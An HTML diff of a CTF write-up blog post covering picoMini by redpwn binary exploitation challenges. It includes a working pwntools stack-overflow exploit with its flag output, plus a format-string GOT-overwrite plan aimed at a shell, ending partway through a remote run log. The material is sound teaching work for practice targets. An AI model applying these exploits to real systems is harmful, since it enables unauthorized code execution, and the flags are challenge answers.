@@ -1,0 +1,1389 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+
+    <title>picoMini by redpwn</title>
+    <meta name="description" content="">
+
+    <link rel="stylesheet" href="https:&#x2F;&#x2F;heinen.dev&#x2F;main.css">
+
+    
+        <link rel="alternate" type="application/atom+xml" title="RSS" href="https://heinen.dev/atom.xml">
+    
+
+    
+    
+</head>
+<body>
+    <a class="skip-main" href="#main">Skip to content</a>
+    <div class="container">
+        <header> 
+            <h1 class="site-header">
+                <a href="https:&#x2F;&#x2F;heinen.dev">Teddy Heinen</a>
+            </h1>
+            <nav>
+                
+                
+                
+                <a  href="https:&#x2F;&#x2F;heinen.dev&#x2F;about&#x2F;">About</a>
+                
+                
+                <a  href="https:&#x2F;&#x2F;heinen.dev&#x2F;tags&#x2F;">Tags</a>
+                
+                
+            </nav>
+        </header>
+        <main id="main" tabindex="-1">
+            
+
+<article class="post">
+    <header>
+        <h1>picoMini by redpwn</h1>
+    </header>
+
+    <ul class="toc">
+	
+	    <li>
+	        <a href="https://heinen.dev/picoctf-2021-redpwn/#clutter-overflow">clutter-overflow</a>
+	        
+	    </li>
+	
+	    <li>
+	        <a href="https://heinen.dev/picoctf-2021-redpwn/#fermat-strings">fermat-strings</a>
+	        
+	            <ul class="toc">
+	                
+	                    <li>
+	                        <a href="https://heinen.dev/picoctf-2021-redpwn/#setup">setup</a>
+	                    </li>
+	                
+	                    <li>
+	                        <a href="https://heinen.dev/picoctf-2021-redpwn/#where-s-the-vulnerability">where&#x27;s the vulnerability?</a>
+	                    </li>
+	                
+	                    <li>
+	                        <a href="https://heinen.dev/picoctf-2021-redpwn/#exploitation">exploitation</a>
+	                    </li>
+	                
+	            </ul>
+	        
+	    </li>
+	
+	    <li>
+	        <a href="https://heinen.dev/picoctf-2021-redpwn/#saas">saas</a>
+	        
+	            <ul class="toc">
+	                
+	                    <li>
+	                        <a href="https://heinen.dev/picoctf-2021-redpwn/#i-would-simply-brute-force-it-me">&quot;I would simply brute force it&quot; - me</a>
+	                    </li>
+	                
+	            </ul>
+	        
+	    </li>
+	
+	    <li>
+	        <a href="https://heinen.dev/picoctf-2021-redpwn/#lockdown-horses">lockdown-horses</a>
+	        
+	            <ul class="toc">
+	                
+	                    <li>
+	                        <a href="https://heinen.dev/picoctf-2021-redpwn/#analysis">analysis</a>
+	                    </li>
+	                
+	                    <li>
+	                        <a href="https://heinen.dev/picoctf-2021-redpwn/#vulnerability">vulnerability</a>
+	                    </li>
+	                
+	                    <li>
+	                        <a href="https://heinen.dev/picoctf-2021-redpwn/#exploitation-1">exploitation</a>
+	                    </li>
+	                
+	            </ul>
+	        
+	    </li>
+	
+	    <li>
+	        <a href="https://heinen.dev/picoctf-2021-redpwn/#vr-school">vr-school</a>
+	        
+	            <ul class="toc">
+	                
+	                    <li>
+	                        <a href="https://heinen.dev/picoctf-2021-redpwn/#analysis-1">analysis</a>
+	                    </li>
+	                
+	                    <li>
+	                        <a href="https://heinen.dev/picoctf-2021-redpwn/#so-how-do-i-exploit-this">so how do i exploit this?</a>
+	                    </li>
+	                
+	            </ul>
+	        
+	    </li>
+	
+	</ul>
+
+    <div class="content">
+        <p>I competed in picoCTF's 2021 mini-competition with the Texas A&amp;M Cybersecurity Club as <a href="https://ctftime.org/team/154567">ret2rev</a> and we placed in sixth place. I worked on the binary exploitation challenges and solved five of the six total. Fun challenges, glad I competed. Writeups are below. </p>
+<span id="continue-reading"></span><h1 id="clutter-overflow">clutter-overflow</h1>
+<pre style="background-color:#212733;">
+<code class="language-text" data-lang="text"><span style="color:#ccc9c2;">Clutter, clutter everywhere and not a byte to use.
+
+nc mars.picoctf.net 31890
+</span></code></pre>
+<p>We're provided <a href="/ctf/picomini-by-redpwn/clutter-overflow/chall.c">source</a> and a <a href="/ctf/picomini-by-redpwn/clutter-overflow/chall">binary</a>. Source isn't super useful here because it's trivially reversible. </p>
+<pre style="background-color:#212733;">
+<code class="language-c" data-lang="c"><span style="color:#ccc9c2;">undefined8 </span><span style="color:#ffd580;">main</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">void</span><span style="color:#ccc9c2;">)
+
+{
+  </span><span style="color:#ffa759;">char</span><span style="color:#ccc9c2;"> local_118 [</span><span style="color:#ffcc66;">264</span><span style="color:#ccc9c2;">]</span><span style="color:#ccc9c2cc;">;
+  </span><span style="color:#ffa759;">long</span><span style="color:#ccc9c2;"> local_10</span><span style="color:#ccc9c2cc;">;
+  
+</span><span style="color:#ccc9c2;">  local_10 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+  </span><span style="color:#f28779;">setbuf</span><span style="color:#ccc9c2;">(stdout</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">)</span><span style="color:#ffcc66;">0x0</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
+  </span><span style="color:#f28779;">setbuf</span><span style="color:#ccc9c2;">(stdin</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">)</span><span style="color:#ffcc66;">0x0</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
+  </span><span style="color:#f28779;">setbuf</span><span style="color:#ccc9c2;">(stderr</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">)</span><span style="color:#ffcc66;">0x0</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
+  </span><span style="color:#f28779;">puts</span><span style="color:#ccc9c2;">(HEADER)</span><span style="color:#ccc9c2cc;">;
+  </span><span style="color:#f28779;">puts</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;My room is so cluttered...&quot;</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
+  </span><span style="color:#f28779;">puts</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;What do you see?&quot;</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
+  </span><span style="color:#f28779;">gets</span><span style="color:#ccc9c2;">(local_118)</span><span style="color:#ccc9c2cc;">;
+  </span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">(local_10 </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">0xdeadbeef</span><span style="color:#ccc9c2;">) {
+    </span><span style="color:#f28779;">printf</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;code == 0x</span><span style="color:#ffcc66;">%llx</span><span style="color:#bae67e;">: how did that happen??</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0xdeadbeef</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
+    </span><span style="color:#f28779;">puts</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;take a flag for your troubles&quot;</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
+    </span><span style="color:#f28779;">system</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;cat flag.txt&quot;</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
+  </span><span style="color:#ccc9c2;">}
+  </span><span style="color:#ffa759;">else </span><span style="color:#ccc9c2;">{
+    </span><span style="color:#f28779;">printf</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;code == 0x</span><span style="color:#ffcc66;">%llx</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;">local_10)</span><span style="color:#ccc9c2cc;">;
+    </span><span style="color:#f28779;">printf</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;code != 0x</span><span style="color:#ffcc66;">%llx</span><span style="color:#bae67e;"> :(</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0xdeadbeef</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
+  </span><span style="color:#ccc9c2;">}
+  </span><span style="color:#ffa759;">return </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ccc9c2;">}
+</span></code></pre>
+<p>Nothing super interesting here; fill up the char buffer, write another 8 bytes of padding, and then write 0xdeadbeef over local_10. It'll compare local_10 and then print the flag. </p>
+<pre style="background-color:#212733;">
+<code class="language-python" data-lang="python"><span style="font-style:italic;color:#5c6773;">#!/usr/bin/env python3
+
+</span><span style="color:#ffa759;">from </span><span style="color:#ccc9c2;">pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
+
+</span><span style="color:#ccc9c2;">exe </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;chall&quot;</span><span style="color:#ccc9c2;">)
+
+context</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">binary </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">exe
+
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">conn</span><span style="color:#ccc9c2;">():
+    </span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">args</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">REMOTE:
+        </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">remote</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;mars.picoctf.net&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">31890</span><span style="color:#ccc9c2;">)
+    </span><span style="color:#ffa759;">elif </span><span style="color:#ccc9c2;">args</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">DEBUG:
+        </span><span style="color:#ffa759;">return </span><span style="color:#ccc9c2;">gdb</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">debug</span><span style="color:#ccc9c2;">([exe</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">path])
+    </span><span style="color:#ffa759;">else</span><span style="color:#ccc9c2;">:
+        </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">process</span><span style="color:#ccc9c2;">([exe</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">path])
+
+
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">main</span><span style="color:#ccc9c2;">():
+    r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">conn</span><span style="color:#ccc9c2;">()
+
+    payload </span><span style="color:#f29e74;">= </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;A&quot;</span><span style="color:#f29e74;">* </span><span style="color:#ffcc66;">0x100
+    </span><span style="color:#ccc9c2;">payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;BBBBBBBB&quot;
+    </span><span style="color:#ccc9c2;">payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p32</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">0xdeadbeef</span><span style="color:#ccc9c2;">)
+
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span style="color:#ccc9c2;">(payload)
+
+    </span><span style="font-style:italic;color:#5c6773;"># good luck pwning :)
+
+    </span><span style="color:#ccc9c2;">r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">interactive</span><span style="color:#ccc9c2;">()
+
+
+</span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">__name__ </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&quot;__main__&quot;</span><span style="color:#ccc9c2;">:
+    </span><span style="color:#ffd580;">main</span><span style="color:#ccc9c2;">()
+</span></code></pre><pre style="background-color:#212733;">
+<code class="language-text" data-lang="text"><span style="color:#ccc9c2;">❯ python solve.py REMOTE
+[*] &#39;/home/sky/Dropbox/ctf/picomini-by-redpwn/clutter-overflow/chall&#39;
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[+] Opening connection to mars.picoctf.net on port 31890: Done
+[*] Switching to interactive mode
+ ______________________________________________________________________
+|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|
+| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |
+|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|
+| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \^ ^ |
+|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \ ^ _ ^ / |                | \^ ^|
+| ^/_\^ ^ ^ /_________\^ ^ ^ /_\ | //  | /_\ ^| |   ____  ____   | | ^ |
+|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|
+| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |
+|^ ^ ^ ^ ^| /     (   \ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \|^ ^|
+.-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |
+|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\ |^ ^|
+| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |
+|&#39;.____&#39;_^||/!\@@@@@/!\|| _&#39;______________.&#39;|==                    =====
+|\|______|===============|________________|/|&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;
+&quot; ||&quot;&quot;&quot;&quot;||&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;||&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;||&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;  
+&quot;&quot;&#39;&#39;&quot;&quot;&quot;&quot;&#39;&#39;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&#39;&#39;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&#39;&#39;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;
+&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;
+&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;
+My room is so cluttered...
+What do you see?
+code == 0xdeadbeef: how did that happen??
+take a flag for your troubles
+picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
+[*] Got EOF while reading in interactive
+</span></code></pre><h1 id="fermat-strings">fermat-strings</h1>
+<pre style="background-color:#212733;">
+<code class="language-text" data-lang="text"><span style="color:#ccc9c2;">Fermat&#39;s last theorem solver as a service.
+
+nc mars.picoctf.net 31929
+</span></code></pre>
+<p>We're provided <a href="/ctf/picomini-by-redpwn/fermat-strings/chall.c">source</a>, a <a href="/ctf/picomini-by-redpwn/fermat-strings/chall">binary</a>, and the executing <a href="/ctf/picomini-by-redpwn/fermat-strings/Dockerfile">Dockerfile</a>. </p>
+<h2 id="setup">setup</h2>
+<p>It isn't super likely I have the same libc version as the remote and making changes when I run on remote vs local is kinda a pain. The solution is to use grab libc from the provided dockerfile, use <a href="https://github.com/io12/pwninit">pwninit</a> to grab a compatible ld, and then use <a href="https://github.com/NixOS/patchelf">patchelf</a> to rewrite the interpreter and rpath so the binary uses the libc in the working directory. </p>
+<pre style="background-color:#212733;">
+<code class="language-bash" data-lang="bash"><span style="color:#ffd580;">pwninit</span><span style="color:#ffcc66;"> --bin</span><span style="color:#ccc9c2;"> chall
+</span><span style="color:#ffd580;">patchelf</span><span style="color:#ffcc66;"> --set-interpreter</span><span style="color:#ccc9c2;"> ld-2.31.so chall
+</span><span style="color:#ffd580;">patchelf</span><span style="color:#ffcc66;"> --set-rpath</span><span style="color:#ccc9c2;"> . chall
+</span></code></pre>
+<p>This technique is super handy to make your local environment as close as possible to the remote. In one of the later challenges, I grab six or so libraries out of the container to ensure some finicky offsets remain the same. </p>
+<h2 id="where-s-the-vulnerability">where's the vulnerability?</h2>
+<p>Name kinda sounds like a format string vuln. We're provided source, so let's take a look!</p>
+<pre style="background-color:#212733;">
+<code class="language-c" data-lang="c"><span style="color:#ffa759;">#include </span><span style="color:#bae67e;">&lt;stdio.h&gt;
+</span><span style="color:#ffa759;">#include </span><span style="color:#bae67e;">&lt;stdlib.h&gt;
+</span><span style="color:#ffa759;">#include </span><span style="color:#bae67e;">&lt;string.h&gt;
+</span><span style="color:#ffa759;">#include </span><span style="color:#bae67e;">&lt;unistd.h&gt;
+</span><span style="color:#ffa759;">#include </span><span style="color:#bae67e;">&lt;math.h&gt;
+
+</span><span style="color:#ffa759;">#define </span><span style="color:#73d0ff;">SIZE </span><span style="color:#ffcc66;">0x100
+
+</span><span style="color:#ffa759;">int </span><span style="color:#ffd580;">main</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">void</span><span style="color:#ccc9c2;">)
+{
+  </span><span style="color:#ffa759;">char</span><span style="color:#ccc9c2;"> A[SIZE]</span><span style="color:#ccc9c2cc;">;
+  </span><span style="color:#ffa759;">char</span><span style="color:#ccc9c2;"> B[SIZE]</span><span style="color:#ccc9c2cc;">;
+
+  </span><span style="color:#ffa759;">int</span><span style="color:#ccc9c2;"> a </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+  </span><span style="color:#ffa759;">int</span><span style="color:#ccc9c2;"> b </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+
+  </span><span style="color:#f28779;">puts</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;Welcome to Fermat</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">&#39;s Last Theorem as a service&quot;</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
+
+  </span><span style="color:#f28779;">setbuf</span><span style="color:#ccc9c2;">(stdout</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">NULL</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
+  </span><span style="color:#f28779;">setbuf</span><span style="color:#ccc9c2;">(stdin</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">NULL</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
+  </span><span style="color:#f28779;">setbuf</span><span style="color:#ccc9c2;">(stderr</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">NULL</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
+
+  </span><span style="color:#f28779;">printf</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;A: &quot;</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
+  </span><span style="color:#ffd580;">read</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;"> A</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;"> SIZE)</span><span style="color:#ccc9c2cc;">;
+  </span><span style="color:#f28779;">printf</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;B: &quot;</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
+  </span><span style="color:#ffd580;">read</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;"> B</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;"> SIZE)</span><span style="color:#ccc9c2cc;">;
+
+</span><span style="color:#ccc9c2;">  A[</span><span style="color:#f28779;">strcspn</span><span style="color:#ccc9c2;">(A</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2;">)] </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ccc9c2;">  B[</span><span style="color:#f28779;">strcspn</span><span style="color:#ccc9c2;">(B</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2;">)] </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+
+</span><span style="color:#ccc9c2;">  a </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">atoi</span><span style="color:#ccc9c2;">(A)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ccc9c2;">  b </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">atoi</span><span style="color:#ccc9c2;">(B)</span><span style="color:#ccc9c2cc;">;
+
+  </span><span style="color:#ffa759;">if</span><span style="color:#ccc9c2;">(a </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">0 </span><span style="color:#f29e74;">||</span><span style="color:#ccc9c2;"> b </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2;">) {
+    </span><span style="color:#f28779;">puts</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;Error: could not parse numbers!&quot;</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
+    </span><span style="color:#ffa759;">return </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
+  </span><span style="color:#ccc9c2;">}
+
+  </span><span style="color:#ffa759;">char</span><span style="color:#ccc9c2;"> buffer[SIZE]</span><span style="color:#ccc9c2cc;">;
+  </span><span style="color:#f28779;">snprintf</span><span style="color:#ccc9c2;">(buffer</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;"> SIZE</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;Calculating for A: </span><span style="color:#ffcc66;">%s</span><span style="color:#bae67e;"> and B: </span><span style="color:#ffcc66;">%s</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;"> A</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;"> B)</span><span style="color:#ccc9c2cc;">;
+  </span><span style="color:#f28779;">printf</span><span style="color:#ccc9c2;">(buffer)</span><span style="color:#ccc9c2cc;">;
+
+  </span><span style="color:#ffa759;">int</span><span style="color:#ccc9c2;"> answer </span><span style="color:#f29e74;">= -</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
+  </span><span style="color:#ffa759;">for</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">int</span><span style="color:#ccc9c2;"> i </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;</span><span style="color:#ccc9c2;"> i </span><span style="color:#f29e74;">&lt; </span><span style="color:#ffcc66;">100</span><span style="color:#ccc9c2cc;">;</span><span style="color:#ccc9c2;"> i</span><span style="color:#f29e74;">++</span><span style="color:#ccc9c2;">) {
+    </span><span style="color:#ffa759;">if</span><span style="color:#ccc9c2;">(</span><span style="color:#f28779;">pow</span><span style="color:#ccc9c2;">(a</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">3</span><span style="color:#ccc9c2;">) </span><span style="color:#f29e74;">+ </span><span style="color:#f28779;">pow</span><span style="color:#ccc9c2;">(b</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">3</span><span style="color:#ccc9c2;">) </span><span style="color:#f29e74;">== </span><span style="color:#f28779;">pow</span><span style="color:#ccc9c2;">(i</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">3</span><span style="color:#ccc9c2;">)) {
+      answer </span><span style="color:#f29e74;">=</span><span style="color:#ccc9c2;"> i</span><span style="color:#ccc9c2cc;">;
+    </span><span style="color:#ccc9c2;">}
+  }
+
+  </span><span style="color:#ffa759;">if</span><span style="color:#ccc9c2;">(answer </span><span style="color:#f29e74;">!= -</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2;">) </span><span style="color:#f28779;">printf</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;Found the answer: </span><span style="color:#ffcc66;">%d</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;"> answer)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ccc9c2;">}
+</span></code></pre>
+<p>Ah, yes, it's a format string vuln.</p>
+<pre style="background-color:#212733;">
+<code class="language-c" data-lang="c"><span style="color:#f29e74;">...
+  </span><span style="color:#ffd580;">snprintf</span><span style="color:#ccc9c2;">(buffer</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;"> SIZE</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;Calculating for A: </span><span style="color:#ffcc66;">%s</span><span style="color:#bae67e;"> and B: </span><span style="color:#ffcc66;">%s</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;"> A</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;"> B)</span><span style="color:#ccc9c2cc;">;
+  </span><span style="color:#ffd580;">printf</span><span style="color:#ccc9c2;">(buffer)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#f29e74;">...
+</span></code></pre>
+<p>Any input we provide is ran through atoi first, but all that means is we have to prefix our payload with a number because atoi will discard non digit characters from the end. </p>
+<h2 id="exploitation">exploitation</h2>
+<p>I did a three step exploit. </p>
+<ol>
+<li>rewrite pow GOT to point to main so we can repeat the vulnerability multiple times</li>
+<li>leak libc base from __libc_start_main</li>
+<li>rewrite strcspn GOT to system</li>
+</ol>
+<p>strcspn is called with both A and B (both of our number). Once we've rewritten the GOT to point to system, we can just pass /bin/sh as a number and it'll give us a shell. </p>
+<pre style="background-color:#212733;">
+<code class="language-text" data-lang="text"><span style="color:#ccc9c2;">❯ python solve.py REMOTE
+[*] &#39;/home/sky/Dropbox/ctf/picomini-by-redpwn/fermat-strings/chall&#39;
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x3fe000)
+    RUNPATH:  b&#39;.&#39;
+[*] &#39;/home/sky/Dropbox/ctf/picomini-by-redpwn/fermat-strings/libc.so.6&#39;
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[*] &#39;/home/sky/Dropbox/ctf/picomini-by-redpwn/fermat-strings/ld-2.31.so&#39;
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to mars.picoctf.net on port 31929: Done
+[*] main address: 0x400837
+[*] pow GOT address: 0x601040
+[*] strcspn GOT address: 0x601048
